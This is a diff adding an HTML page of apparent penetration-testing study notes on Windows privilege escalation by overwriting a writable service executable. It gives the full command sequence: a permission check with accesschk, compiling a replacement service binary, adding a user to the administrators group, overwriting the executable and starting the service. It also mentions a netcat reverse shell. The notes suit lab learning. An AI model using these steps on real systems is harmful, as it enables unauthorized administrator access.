@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Insecure Service Executables (Overwrite .exe)</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Insecure Service Executables (Overwrite .exe)</h1><br/>Service Executable Files<br />	.\accesschk64.exe -quvw /accepteula &quot;C:\Program Files\File Permissions Service&quot; 	(PowerUp is more likely to find this for you.)<br />	if the &quot;Everyone user group has &quot;FILE_ALL_ACCESS&quot; permission on a file for a service that is executed as an admin we can overwrite it with our own service executable (and hopefully start the service).<br />	windows_service.c is kept in the compiled binaries github<br />			Edit the line to change the commands you are going to run (probably add a user to the administrators group or run NC for a rev shell).<br />			example: cmd.exe /k net localgroup administrators squid /add<br />			compile it with     x86_64-w64-mingw32-gcc windows_service.c -o x.exe          (apt install gcc-mingw-w64)<br />			put x.exe on the target<br />	<br />	Backup the original file.	<br />	copy /y c:\Temp\x.exe &quot;c:\Program Files\File Permissions Service\filepermservice.exe&quot;<br />	sc start filepermsvc<br /><br />	---Note---Regular executables are sometimes fine. I am unsure as to what the delineation is.</div></body></html>
